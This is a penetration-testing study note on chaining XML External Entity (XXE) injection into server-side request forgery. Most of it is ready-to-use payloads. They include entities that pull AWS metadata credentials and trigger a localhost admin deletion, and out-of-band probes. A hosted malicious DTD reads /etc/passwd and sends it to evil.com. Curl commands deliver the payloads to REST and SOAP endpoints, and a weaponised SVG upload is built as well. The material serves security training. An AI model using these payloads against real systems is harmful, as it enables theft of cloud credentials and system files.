---
tags: [vapt, ssrf, xxe, intermediate]
difficulty: intermediate
module: "13 - SSRF"
topic: "13.06 SSRF via XML (XXE Chained)"
---

# 13.06 — SSRF via XML (XXE Chained)

## XXE → SSRF Overview

```
XXE = XML External Entity

When an app parses XML and allows external entity references,
those entities can reference URLs! The XML parser fetches those URLs
on behalf of the server → SSRF!

XML → parser → entity reference → HTTP request → SSRF!

XXE SSRF is particularly powerful because:
✓ XML parsers often bypass URL filters (they use direct socket connections)
✓ Supports file://, http://, ftp:// etc depending on parser
✓ Can exfiltrate data inline (XXE output appears in XML response)
✓ Works with SOAP, REST with XML body, file uploads (DOCX/SVG/etc)
```

---

## Basic XXE SSRF Payload

```xml
<!-- INLINE XXE SSRF — DATA APPEARS IN RESPONSE: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>

<!-- If server echoes back productId value → credentials in response! -->

<!-- TARGETING LOCALHOST ADMIN: -->
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://localhost/admin/delete?user=carlos">
]>
<data>&xxe;</data>
```

---

## Blind XXE SSRF (Out-of-Band)

```xml
<!-- WHEN RESPONSE DOESN'T INCLUDE ENTITY VALUE: -->

<!-- METHOD 1: PARAMETER ENTITIES WITH EXTERNAL DTD: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_BURP_COLLABORATOR.burpcollaborator.net/"> 
  %xxe;
]>
<foo>test</foo>

<!-- Server fetches the external DTD URL → Burp Collaborator receives DNS/HTTP! -->

<!-- METHOD 2: DIRECT ENTITY FOR DNS PING: -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://YOUR_BURP_COLLABORATOR.burpcollaborator.net/">
]>
<foo>&xxe;</foo>
```

---

## Data Exfiltration via XXE SSRF

```xml
<!-- EXFILTRATING DATA USING PARAMETER ENTITIES: -->

<!-- STEP 1: HOST A MALICIOUS DTD ON YOUR SERVER (evil.dtd): -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://evil.com/?data=%file;'>">
%eval;
%exfiltrate;

<!-- STEP 2: SEND XML PAYLOAD THAT FETCHES YOUR DTD: -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>

<!-- FLOW:
  1. XML parser reads the payload
  2. Fetches evil.dtd from evil.com
  3. evil.dtd defines %file = contents of /etc/passwd
  4. evil.dtd defines %exfiltrate = send file contents to evil.com
  5. %exfiltrate triggers: GET http://evil.com/?data=[passwd contents]
  6. evil.com receives /etc/passwd via query string!
-->
```

---

## XXE in Different Content Types

```bash
# XML IN REST API (when app accepts XML):
curl -X POST "https://target.com/api/check-stock" \
  -H "Content-Type: application/xml" \
  -H "Cookie: session=YOURS" \
  -d '<?xml version="1.0"?>
      <!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
      <root><item>&xxe;</item></root>'

# CONVERT JSON TO XML (sometimes works):
# If app accepts both: change Content-Type: application/json → application/xml
# Rewrite body as XML with XXE payload

# SOAP API:
curl -X POST "https://target.com/soap" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
      <!DOCTYPE soap [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
      <SOAP-ENV:Envelope>
        <SOAP-ENV:Body>
          <getUser><id>&xxe;</id></getUser>
        </SOAP-ENV:Body>
      </SOAP-ENV:Envelope>'

# SVG FILE (upload as avatar/image):
cat > ssrf.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
EOF
```

---

## Finding XML-Accepting Endpoints

```bash
# LOOK FOR XML ENDPOINTS IN BURP:
# HTTP History → filter by Content-Type: application/xml, text/xml

# TRY CONVERTING JSON TO XML:
# Original: POST /api/data with Content-Type: application/json
# Try:      POST /api/data with Content-Type: application/xml
# Convert body to XML

# TEST SVG/DOCX/XML FILE UPLOADS:
# Upload SVG file containing XXE → check if server fetches external entity

# IDENTIFY SOAP ENDPOINTS:
# Look for: .wsdl files, SOAPAction headers, XML response bodies
curl -s https://target.com/ -H "Accept: application/wsdl+xml"
```

---

## Related Notes
- [[01 - What is SSRF]] — SSRF basics
- [[05 - SSRF via File Imports]] — file-based SSRF
- [[07 - Blind SSRF]] — out-of-band detection
- [[09 - SSRF Cloud Metadata AWS]] — cloud credential theft via XXE
- [[Module 14 - XXE]] — full XXE module
